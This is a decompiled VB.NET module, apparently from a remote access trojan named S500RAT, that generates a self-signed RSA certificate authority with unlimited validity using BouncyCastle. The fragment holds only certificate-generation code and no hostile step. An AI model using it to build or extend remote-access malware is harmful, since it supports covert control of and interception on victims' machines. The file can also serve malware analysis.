Imports System
Imports System.Security.Cryptography.X509Certificates
Imports Microsoft.VisualBasic.CompilerServices
Imports Org.BouncyCastle.Asn1.X509
Imports Org.BouncyCastle.Crypto
Imports Org.BouncyCastle.Crypto.Generators
Imports Org.BouncyCastle.Crypto.Operators
Imports Org.BouncyCastle.Crypto.Parameters
Imports Org.BouncyCastle.Crypto.Prng
Imports Org.BouncyCastle.Math
Imports Org.BouncyCastle.Security
Imports Org.BouncyCastle.X509
Imports Org.BouncyCastle.X509.Extension

Namespace S500RAT
	' Token: 0x02000069 RID: 105
	Public NotInheritable Module CreateCertificate
		' Token: 0x060011DA RID: 4570 RVA: 0x0009F698 File Offset: 0x0009D898
		Public Function CreateCertificateAuthority(caName As String, keyStrength As Integer) As X509Certificate2
			Dim random As SecureRandom = New SecureRandom(New CryptoApiRandomGenerator())
			Dim rsaKeyPairGenerator As RsaKeyPairGenerator = New RsaKeyPairGenerator()
			rsaKeyPairGenerator.Init(New KeyGenerationParameters(random, keyStrength))
			Dim asymmetricCipherKeyPair As AsymmetricCipherKeyPair = rsaKeyPairGenerator.GenerateKeyPair()
			Dim x509V3CertificateGenerator As X509V3CertificateGenerator = New X509V3CertificateGenerator()
			Dim x509Name As X509Name = New X509Name("CN=" + caName)
			Dim serialNumber As BigInteger = BigInteger.ProbablePrime(120, random)
			x509V3CertificateGenerator.SetSerialNumber(serialNumber)
			x509V3CertificateGenerator.SetSubjectDN(x509Name)
			x509V3CertificateGenerator.SetIssuerDN(x509Name)
			x509V3CertificateGenerator.SetNotAfter(DateTime.MaxValue)
			x509V3CertificateGenerator.SetNotBefore(DateTime.UtcNow.Subtract(New TimeSpan(2, 0, 0, 0)))
			x509V3CertificateGenerator.SetPublicKey(asymmetricCipherKeyPair.[Public])
			x509V3CertificateGenerator.AddExtension(X509Extensions.SubjectKeyIdentifier, False, New SubjectKeyIdentifierStructure(asymmetricCipherKeyPair.[Public]))
			x509V3CertificateGenerator.AddExtension(X509Extensions.BasicConstraints, True, New BasicConstraints(True))
			Dim signatureCalculatorFactory As ISignatureFactory = New Asn1SignatureFactory("SHA512WITHRSA", asymmetricCipherKeyPair.[Private], random)
			Dim x509Cert As Org.BouncyCastle.X509.X509Certificate = x509V3CertificateGenerator.Generate(signatureCalculatorFactory)
			Return New X509Certificate2(DotNetUtilities.ToX509Certificate(x509Cert)) With { .PrivateKey = DotNetUtilities.ToRSA(TryCast(asymmetricCipherKeyPair.[Private], RsaPrivateCrtKeyParameters)) }
		End Function
	End Module
End Namespace
